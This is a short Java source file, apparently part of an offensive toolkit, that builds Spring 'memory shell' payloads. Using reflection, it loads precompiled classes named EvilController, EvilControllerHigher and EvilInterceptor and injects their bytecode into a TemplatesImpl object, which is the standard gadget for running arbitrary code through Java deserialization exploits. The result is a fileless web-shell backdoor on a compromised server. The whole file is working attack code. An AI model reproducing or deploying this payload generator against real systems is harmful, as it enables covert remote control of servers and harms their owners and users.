package cn.org.unk.memshell.spring;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import cn.org.unk.Util;

import java.io.InputStream;
import java.lang.reflect.Field;

public class SpringShellGen {

    public static TemplatesImpl controllerShell() throws Exception{
        return doGen("EvilController.class");
    }
    //springboot > 2.6
    public static TemplatesImpl controllerShellHigher() throws Exception{

        return doGen("EvilControllerHigher.class");
    }
    public static TemplatesImpl interceptorShell() throws Exception{
        return doGen("EvilInterceptor.class");
    }
    private static TemplatesImpl doGen(String shellClass) throws Exception{
        InputStream resourceAsStream = SpringShellGen.class.getResourceAsStream(shellClass);
        byte[] code = Util.inputStream2ByteArray(resourceAsStream);
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        TemplatesImpl o = new TemplatesImpl();
        byte[][] b = new byte[][]{code};
        bytecodes.set(o, b);
        Field _name = clazz.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(o, "Hello");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(o, new TransformerFactoryImpl());
        Field _transletIndex = clazz.getDeclaredField("_transletIndex");
        _transletIndex.setAccessible(true);
        _transletIndex.set(o, 0);
        return o;
    }

}
